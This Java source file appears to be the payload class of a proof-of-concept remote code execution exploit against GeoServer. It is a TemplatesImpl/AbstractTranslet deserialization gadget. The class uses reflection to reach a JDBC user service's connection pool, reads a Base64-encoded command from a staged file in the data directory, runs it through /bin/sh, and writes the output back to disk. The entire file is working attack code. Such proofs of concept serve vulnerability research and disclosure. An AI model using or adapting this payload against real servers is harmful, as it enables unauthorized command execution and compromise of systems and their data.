package die.verwandlung;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.util.Base64;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

/** Command runner embedded in the XSLTC TemplatesImpl object graph. */
public final class CommandTranslet extends AbstractTranslet {
    private static final AtomicBoolean EXECUTED = new AtomicBoolean();
    private static final String SERVICE_NAME = "jdbc_geoserver_poc";
    private static final String STAGING_PREFIX = "gs-rce-";
    private static final int MAX_REQUEST_BYTES = 718;
    private static final int MAX_COMMAND_BYTES = 512;
    private static final int MAX_OUTPUT_BYTES = 1_048_576;
    private static final long COMMAND_TIMEOUT_SECONDS = 30;
    private static final long POOL_TIMEOUT_SECONDS = 30;
    private static final long POOL_QUIET_MILLIS = 1_000;

    public CommandTranslet() {
        if (!EXECUTED.compareAndSet(false, true)) return;

        Process process = null;
        try {
            Path dataDirectory = locateDataDirectory();
            if (!dataDirectory.isAbsolute()) {
                throw new IllegalStateException("GeoServer data directory is not absolute");
            }
            Object[] target = resolveExactPool(dataDirectory);
            Object dataSource = target[0];
            Path staging = (Path) target[1];
            String token = (String) target[2];

            String[] request = readRequest(staging.resolve("request.txt"));
            if (!token.equals(request[0])) {
                throw new IllegalArgumentException("request token does not match JDBC URL");
            }
            byte[] commandBytes = Base64.getDecoder().decode(request[1]);
            if (!request[1].equals(Base64.getEncoder().encodeToString(commandBytes))) {
                throw new IllegalArgumentException("command is not canonical Base64");
            }
            validateCommand(commandBytes);
            claimRequest(staging.resolve("request.txt"), staging.resolve("request.claimed"), token);
            String command = new String(commandBytes, StandardCharsets.US_ASCII);

            process =
                    new ProcessBuilder("/bin/sh", "-c", command)
                            .redirectErrorStream(true)
                            .start();
            Process commandProcess = process;
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            boolean[] outputTruncated = {false};
            Thread reader =
                    new Thread(
                            () -> drain(commandProcess.getInputStream(), output, outputTruncated),
                            "gs-rce-output-reader");
            reader.setDaemon(true);
            reader.start();

            boolean timedOut = !process.waitFor(COMMAND_TIMEOUT_SECONDS, TimeUnit.SECONDS);
            if (timedOut) {
                process.descendants().forEach(ProcessHandle::destroyForcibly);
                process.destroyForcibly();
                process.waitFor(5, TimeUnit.SECONDS);
            }
            int exitCode = process.isAlive() ? -1 : process.exitValue();
            reader.join(5_000);
            if (reader.isAlive()) {
                commandProcess.getInputStream().close();
                reader.join(1_000);
                outputTruncated[0] = true;
            }
            byte[] captured;
            synchronized (output) {
                captured = output.toByteArray();
            }

            publishResult(
                    staging.resolve("result.txt"),
                    token,
                    commandBytes,
                    exitCode,
                    timedOut,
                    outputTruncated[0],
                    captured);
            startPoolCleanup(dataSource, staging, token);
        } catch (Throwable ignored) {
            if (process != null && process.isAlive()) {
                process.descendants().forEach(ProcessHandle::destroyForcibly);
                process.destroyForcibly();
            }
        }
    }

    private static Object[] resolveExactPool(Path dataDirectory) throws Exception {
        Class<?> extensions = Class.forName("org.geoserver.platform.GeoServerExtensions");
        Class<?> managerType = Class.forName("org.geoserver.security.GeoServerSecurityManager");
        Object manager = extensions.getMethod("bean", Class.class).invoke(null, managerType);
        if (manager == null) throw new IllegalStateException("security manager is unavailable");

        Field cacheField = managerType.getDeclaredField("userGroupServices");
        cacheField.setAccessible(true);
        Object cacheObject = cacheField.get(manager);
        if (!(cacheObject instanceof Map<?, ?> cache)) {
            throw new IllegalStateException("user service cache is unavailable");
        }
        Object service = cache.get(SERVICE_NAME);
        Class<?> serviceType =
                Class.forName("org.geoserver.security.jdbc.JDBCUserGroupService");
        if (service == null || service.getClass() != serviceType) {
            throw new IllegalStateException("exact JDBC user service is unavailable");
        }
        if (!SERVICE_NAME.equals(serviceType.getMethod("getName").invoke(service))) {
            throw new IllegalStateException("JDBC user service name does not match");
        }

        Class<?> jdbcBase = Class.forName("org.geoserver.security.jdbc.AbstractJDBCService");
        Field dataSourceField = jdbcBase.getDeclaredField("datasource");
        dataSourceField.setAccessible(true);
        Object dataSource = dataSourceField.get(service);
        Class<?> basicType = Class.forName("org.apache.commons.dbcp.BasicDataSource");
        if (dataSource == null || dataSource.getClass() != basicType) {
            throw new IllegalStateException("exact BasicDataSource is unavailable");
        }
        if ((Boolean) basicType.getMethod("isClosed").invoke(dataSource)) {
            throw new IllegalStateException("JDBC pool is already closed");
        }

        String url = (String) basicType.getMethod("getUrl").invoke(dataSource);
        String prefix = "jdbc:hsqldb:file:" + dataDirectory.resolve(STAGING_PREFIX);
        String suffix = File.separator + "payload;shutdown=true";
        if (url == null
                || url.length() != prefix.length() + 32 + suffix.length()
                || !url.startsWith(prefix)
                || !url.endsWith(suffix)) {
            throw new IllegalStateException("JDBC URL does not match the staging format");
        }
        String token = url.substring(prefix.length(), prefix.length() + 32);
        if (!isToken(token) || !url.equals(prefix + token + suffix)) {
            throw new IllegalStateException("JDBC URL token is invalid");
        }
        return new Object[] {dataSource, dataDirectory.resolve(STAGING_PREFIX + token), token};
    }

    private static String[] readRequest(Path requestPath) throws Exception {
        byte[] encoded;
        try (InputStream input = Files.newInputStream(requestPath)) {
            encoded = input.readNBytes(MAX_REQUEST_BYTES + 1);
        }
        if (encoded.length > MAX_REQUEST_BYTES) {
            throw new IllegalArgumentException("request is too large");
        }
        String request = new String(encoded, StandardCharsets.US_ASCII);
        int firstNewline = request.indexOf('\n');
        int secondNewline = request.indexOf('\n', firstNewline + 1);
        if (firstNewline < 0
                || secondNewline != request.length() - 1
                || request.indexOf('\n', secondNewline + 1) >= 0) {
            throw new IllegalArgumentException("invalid request format");
        }
        String token = request.substring(0, firstNewline);
        if (!isToken(token)) throw new IllegalArgumentException("invalid request token");
        return new String[] {token, request.substring(firstNewline + 1, secondNewline)};
    }

    private static boolean isToken(String token) {
        if (token.length() != 32) return false;
        for (int index = 0; index < token.length(); index++) {
            char character = token.charAt(index);
            if (!((character >= '0' && character <= '9')
                    || (character >= 'a' && character <= 'f'))) return false;
        }
        return true;
    }

    private static void claimRequest(Path request, Path claim, String token) throws Exception {
        Files.writeString(
                claim,
                token + "\n",
                StandardCharsets.US_ASCII,
                StandardOpenOption.CREATE_NEW,
                StandardOpenOption.WRITE);
        Files.delete(request);
    }

    private static void validateCommand(byte[] command) {
        if (command.length == 0 || command.length > MAX_COMMAND_BYTES) {
            throw new IllegalArgumentException("invalid command length");
        }
        for (byte character : command) {
            int value = character & 0xff;
            if (value < 0x20 || value > 0x7e) {
                throw new IllegalArgumentException("command is not printable ASCII");
            }
        }
    }

    private static void drain(
            InputStream input, ByteArrayOutputStream output, boolean[] outputTruncated) {
        byte[] buffer = new byte[8_192];
        try {
            int count;
            while ((count = input.read(buffer)) != -1) {
                synchronized (output) {
                    int remaining = MAX_OUTPUT_BYTES - output.size();
                    if (remaining > 0) output.write(buffer, 0, Math.min(remaining, count));
                    if (count > remaining) outputTruncated[0] = true;
                }
            }
        } catch (Throwable ignored) {
            outputTruncated[0] = true;
        }
    }

    private static void publishResult(
            Path result,
            String token,
            byte[] command,
            int exitCode,
            boolean timedOut,
            boolean outputTruncated,
            byte[] output)
            throws Exception {
        Base64.Encoder base64 = Base64.getEncoder();
        publish(
                result,
                "token="
                        + token
                        + "\ncommand_b64="
                        + base64.encodeToString(command)
                        + "\nexit_code="
                        + exitCode
                        + "\ntimed_out="
                        + timedOut
                        + "\noutput_truncated="
                        + outputTruncated
                        + "\noutput_b64="
                        + base64.encodeToString(output)
                        + "\n");
    }

    private static void startPoolCleanup(Object dataSource, Path staging, String token) {
        Thread cleanup =
                new Thread(
                        () -> closePoolAndPublish(dataSource, staging, token),
                        "gs-rce-pool-cleanup");
        cleanup.setDaemon(true);
        cleanup.start();
    }

    private static void closePoolAndPublish(Object dataSource, Path staging, String token) {
        boolean closed = false;
        try {
            Class<?> basicType = dataSource.getClass();
            Method getNumActive = basicType.getMethod("getNumActive");
            long deadline = System.nanoTime() + TimeUnit.SECONDS.toNanos(POOL_TIMEOUT_SECONDS);
            long quietSince = -1;
            while (System.nanoTime() < deadline) {
                int active = ((Number) getNumActive.invoke(dataSource)).intValue();
                if (active == 0) {
                    if (quietSince < 0) quietSince = System.nanoTime();
                    if (System.nanoTime() - quietSince
                            >= TimeUnit.MILLISECONDS.toNanos(POOL_QUIET_MILLIS)) break;
                } else {
                    quietSince = -1;
                }
                Thread.sleep(50);
            }
            if (quietSince >= 0
                    && System.nanoTime() - quietSince
                            >= TimeUnit.MILLISECONDS.toNanos(POOL_QUIET_MILLIS)) {
                basicType.getMethod("close").invoke(dataSource);
                closed = (Boolean) basicType.getMethod("isClosed").invoke(dataSource);
            }
        } catch (Throwable ignored) {
            closed = false;
        }

        try {
            publish(
                    staging.resolve("cleanup.txt"),
                    "token=" + token + "\npool_closed=" + closed + "\n");
        } catch (Throwable ignored) {
            // result.txt was already published independently of cleanup.
        }
    }

    private static void publish(Path destination, String contents) throws Exception {
        Path temporary = destination.resolveSibling(destination.getFileName() + ".tmp");
        Files.writeString(
                temporary,
                contents,
                StandardCharsets.US_ASCII,
                StandardOpenOption.CREATE_NEW,
                StandardOpenOption.WRITE);
        try {
            Files.move(temporary, destination);
        } finally {
            Files.deleteIfExists(temporary);
        }
    }

    private static Path locateDataDirectory() throws Exception {
        Class<?> extensions = Class.forName("org.geoserver.platform.GeoServerExtensions");
        Class<?> loaderType = Class.forName("org.geoserver.platform.GeoServerResourceLoader");
        Object loader = extensions.getMethod("bean", Class.class).invoke(null, loaderType);
        if (loader == null) throw new IllegalStateException("resource loader is unavailable");
        File base = (File) loaderType.getMethod("getBaseDirectory").invoke(loader);
        if (base == null) throw new IllegalStateException("GeoServer data directory is unavailable");
        return base.toPath();
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
            throws TransletException {}

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
}
